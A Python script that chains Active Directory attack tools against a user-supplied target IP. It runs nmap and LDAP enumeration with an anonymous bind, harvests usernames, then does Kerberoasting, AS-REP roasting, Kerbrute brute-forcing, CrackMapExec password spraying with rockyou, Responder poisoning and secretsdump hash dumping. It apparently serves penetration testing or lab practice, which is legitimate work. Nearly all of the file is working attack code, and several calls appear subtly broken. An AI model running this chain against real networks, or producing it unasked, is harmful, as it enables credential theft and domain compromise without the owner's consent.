import subprocess
import os
import signal

# Flag to determine if brute-forcing is interrupted
bruteforce_skipped = False

# Function to handle signal for skipping brute-forcing
def signal_handler(sig, frame):
    global bruteforce_skipped
    print("\n[!] Brute-forcing skipped by user (Ctrl+C detected).")
    bruteforce_skipped = True

# Register the signal handler for skipping
signal.signal(signal.SIGINT, signal_handler)

# Function to check if a tool is installed
def is_tool_installed(tool_name, install_command=None):
    try:
        subprocess.run([tool_name, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except FileNotFoundError:
        print(f"[-] {tool_name} is not installed.")
        if install_command:
            print(f"[+] You can install it using: {install_command}")
        return False

# Check for required tools
def check_required_tools():
    required_tools = {
        "ldapsearch": "sudo apt install ldap-utils",
        "crackmapexec": "sudo apt install crackmapexec",
        "responder": "sudo apt install responder",
        "kerbrute": "go install github.com/ropnop/kerbrute@latest",
    }
    impacket_scripts = {
        "GetUserSPNs.py": "pip install impacket && cd /usr/share/doc/python3-impacket/examples/",
        "GetNPUsers.py": "pip install impacket && cd /usr/share/doc/python3-impacket/examples/",
        "secretsdump.py": "pip install impacket && cd /usr/share/doc/python3-impacket/examples/",
    }

    for tool, install_cmd in required_tools.items():
        if not is_tool_installed(tool, install_cmd):
            print(f"[-] Please install {tool} before running the script.")
            exit()

    for script, install_cmd in impacket_scripts.items():
        if not os.path.exists(f"/usr/share/doc/python3-impacket/examples/{script}"):
            print(f"[-] {script} not found. You can install it by running: {install_cmd}")
            exit()

# Nmap Scan Function
def run_nmap(ip):
    nmap_command = ["nmap", "-sV", "-A", "-T5", ip]
    result = subprocess.run(nmap_command, capture_output=True, text=True)
    return result.stdout

# Function to extract domain from Nmap output
def find_domain(nmap_result):
    print("[*] Attempting to find the domain from the Nmap scan results...")
    try:
        for line in nmap_result.splitlines():
            if "Domain name:" in line or "Domain:" in line:
                domain = line.split(":")[1].strip()
                print(f"[+] Domain found: {domain}")
                return domain
        print("[-] Domain not found in Nmap results.")
        return None
    except Exception as e:
        print(f"[-] Could not extract domain: {e}")
        return None

# Function to find domain controllers via DNS SRV records
def find_domain_controllers(domain):
    print(f"[*] Querying DNS SRV records to find Domain Controllers for {domain}...")
    try:
        dns_query = f"nslookup -type=srv _ldap._tcp.dc._msdcs.{domain}"
        result = subprocess.run(dns_query, shell=True, capture_output=True, text=True)
        dns_output = result.stdout
        dns_errors = result.stderr

        if result.returncode != 0:
            print(f"[-] Failed to query domain controllers: {dns_errors}")
            return None

        print(f"[+] Domain Controllers found:\n{dns_output}")
        return dns_output

    except Exception as e:
        print(f"[-] Error finding Domain Controllers: {e}")
        return None

# Function to run multiple LDAP queries and collect information
def ldap_enum(ip, domain):
    try:
        # Convert domain to correct LDAP base DN format (e.g., secura.yzx -> DC=secura,DC=yzx)
        base_dn = f"DC={domain.replace('.', ',DC=')}"
        ldap_info_file = "ldap_info.txt"

        # LDAP command to collect users (sAMAccountName)
        ldap_user_command = f"ldapsearch -x -H ldap://{ip} -b '{base_dn}' '(objectclass=person)' sAMAccountName"
        print(f"Running LDAP User Enumeration: {ldap_user_command}")
        result_users = subprocess.run(ldap_user_command, shell=True, capture_output=True, text=True)

        # Save usernames to users.txt
        ldap_output_users = result_users.stdout
        usernames = []
        for line in ldap_output_users.splitlines():
            if "sAMAccountName:" in line:
                usernames.append(line.split(":")[1].strip())

        if usernames:
            with open("users.txt", "w") as user_file:
                for username in usernames:
                    user_file.write(f"{username}\n")
            print("[+] Usernames extracted and saved to users.txt.")
        else:
            print("[-] No sAMAccountNames found in LDAP enumeration.")

        # Other LDAP Queries to gather more information (groups, domain controllers, OUs, etc.)
        ldap_queries = [
            f"ldapsearch -x -H ldap://{ip} -b '{base_dn}' '(objectclass=group)' cn",
            f"ldapsearch -x -H ldap://{ip} -b '{base_dn}' '(objectclass=organizationalUnit)' ou",
            f"ldapsearch -x -H ldap://{ip} -b '{base_dn}' '(objectclass=domainController)' dn"
        ]

        with open(ldap_info_file, "w") as info_file:
            for query in ldap_queries:
                print(f"Running LDAP Query: {query}")
                result = subprocess.run(query, shell=True, capture_output=True, text=True)
                ldap_output = result.stdout
                ldap_errors = result.stderr

                # Save the results of each LDAP query into ldap_info.txt
                info_file.write(f"\n=== Results for query: {query} ===\n")
                info_file.write(ldap_output)
                if ldap_errors:
                    info_file.write(f"\nErrors for query: {query}\n")
                    info_file.write(ldap_errors)

        print(f"[+] Additional LDAP data saved to {ldap_info_file}.")

        # Run anonymous LDAP bind with empty credentials
        ldap_anonymous_command = f"ldapsearch -x -h {ip} -D '' -w '' -b '{base_dn}'"
        print(f"Running anonymous LDAP bind with: {ldap_anonymous_command}")
        result_anonymous = subprocess.run(ldap_anonymous_command, shell=True, capture_output=True, text=True)

        # Save anonymous bind output to ldap_info.txt
        with open(ldap_info_file, "a") as info_file:
            info_file.write(f"\n=== Anonymous LDAP Bind Results ===\n")
            info_file.write(result_anonymous.stdout)
            if result_anonymous.stderr:
                info_file.write("\nAnonymous LDAP Bind Errors:\n")
                info_file.write(result_anonymous.stderr)

        return usernames

    except Exception as e:
        print(f"[-] LDAP Enumeration failed: {e}")
        return []

# Kerberoasting using Impacket's GetUserSPNs with extracted users
def kerberoasting(ip, domain):
    try:
        if os.path.exists("users.txt"):
            kerb_command = f"/usr/share/doc/python3-impacket/examples/GetUserSPNs.py {domain}/ -usersfile users.txt -request -dc-ip {ip}"
            print(f"Running Kerberoasting: {kerb_command}")
            subprocess.run(kerb_command, shell=True)
        else:
            print("[-] No usernames available for Kerberoasting.")
    except Exception as e:
        print(f"[-] Kerberoasting failed: {e}")

# AS-REP Roasting using Impacket's GetNPUsers
def asrep_roasting(ip, domain):
    try:
        asrep_command = f"/usr/share/doc/python3-impacket/examples/GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -format hashcat -dc-ip {ip}"
        print(f"Running AS-REP Roasting: {asrep_command}")
        subprocess.run(asrep_command, shell=True)
    except Exception as e:
        print(f"[-] AS-REP Roasting failed: {e}")

# Password Spraying with CrackMapExec, with Ctrl+C to skip
def password_spray(ip, domain):
    global bruteforce_skipped
    spray_command = f"crackmapexec smb {ip} -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success"
    print(f"Running Password Spraying: {spray_command}")

    try:
        subprocess.run(spray_command, shell=True)
    except KeyboardInterrupt:
        print("\n[!] Brute-forcing skipped by user.")
        bruteforce_skipped = True

# NTLM Relay Attack using Responder
def ntlm_relay():
    responder_command = "responder -I eth0"
    print(f"Starting Responder for NTLM Relay attacks: {responder_command}")
    subprocess.run(responder_command, shell=True)

# Extract NTLM Hashes with SecretsDump
def dump_ntlm_hashes(ip, domain):
    try:
        dump_command = f"/usr/share/doc/python3-impacket/examples/secretsdump.py {domain}/ -usersfile users.txt -dc-ip {ip}"
        print(f"Dumping NTLM hashes: {dump_command}")
        subprocess.run(dump_command, shell=True)
    except Exception as e:
        print(f"[-] NTLM Hash Dump failed: {e}")

# Run Kerbrute after LDAP user enumeration
def run_kerbrute(domain):
    try:
        if os.path.exists("users.txt"):
            kerbrute_command = f"kerbrute -domain {domain} -users users.txt"
            print(f"Running Kerbrute: {kerbrute_command}")
            subprocess.run(kerbrute_command, shell=True)
        else:
            print("[-] No usernames found for Kerbrute brute-forcing.")
    except Exception as e:
        print(f"[-] Kerbrute brute-forcing failed: {e}")

# Main function that runs the enumeration and exploitation steps based on Nmap results
def main():
    check_required_tools()

    target_ip = input("Enter the target IP: ")

    # Run Nmap scan
    print("Starting Nmap scan...")
    nmap_result = run_nmap(target_ip)
    print(nmap_result)

    # Attempt to find the domain automatically
    domain = find_domain(nmap_result)
    if not domain:
        domain = input("Enter the domain manually (e.g., example.com): ")

    # Identify Domain Controllers via DNS SRV queries
    find_domain_controllers(domain)

    # Smart Enumeration and Exploitation Based on Detected Services
    if "445/tcp" in nmap_result:
        print("[+] SMB Detected, running enumeration...")

    if "389/tcp" in nmap_result or "636/tcp" in nmap_result:
        print("[+] LDAP Detected, running enumeration...")
        usernames = ldap_enum(target_ip, domain)

    if usernames:
        print("[+] Kerberos Detected, running Kerberoasting...")
        kerberoasting(target_ip, domain)
        
        print("[+] Running AS-REP Roasting...")
        asrep_roasting(target_ip, domain)

        print("[+] Running Kerbrute for brute-forcing...")
        run_kerbrute(domain)

    if not bruteforce_skipped:
        print("[+] Running password spraying...")
        password_spray(target_ip, domain)

    print("[+] Running NTLM Relay attacks with Responder...")
    ntlm_relay()

    print("[+] Dumping NTLM hashes from the target...")
    dump_ntlm_hashes(target_ip, domain)

    print("Enumeration and exploitation complete.")

if __name__ == "__main__":
    main()
